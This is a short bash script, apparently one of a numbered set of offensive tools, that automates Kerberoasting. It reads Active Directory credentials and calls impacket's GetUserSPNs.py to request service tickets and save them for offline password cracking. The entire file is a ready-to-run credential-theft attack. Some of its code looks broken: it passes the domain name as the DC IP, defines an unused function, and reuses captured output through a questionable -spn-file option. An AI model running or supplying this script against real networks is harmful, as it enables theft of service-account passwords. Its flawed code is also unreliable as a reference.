#!/usr/bin/env bash
# kerberoast.sh
# 9. Active Directory Kerberoast Helper
# Extracts Service Principal Names and requests Kerberoast tickets for offline cracking.
# Usage: ./kerberoast.sh
# Requires: impacket Python scripts (GetUserSPNs.py)

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux" ;;
    Darwin*) echo "darwin" ;;
    *) echo "unknown" ;;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] Please install $t manually"; exit 1
  fi
}

function get_credentials() {
  read -rp "Enter AD domain (e.g., corp.local): " AD
  read -rp "Enter username: " USER
  read -rsp "Enter password: " PASS; echo
}
ensure_tool GetUserSPNs.py
get_credentials

# Extract SPNs
GetUserSPNs.py -request -dc-ip ${AD} ${AD}/${USER}:${PASS} | tee spns.txt

# Roast tickets
GetUserSPNs.py -request -dc-ip ${AD} -spn-file spns.txt ${AD}/${USER}:${PASS} | tee kerberoast.tgs
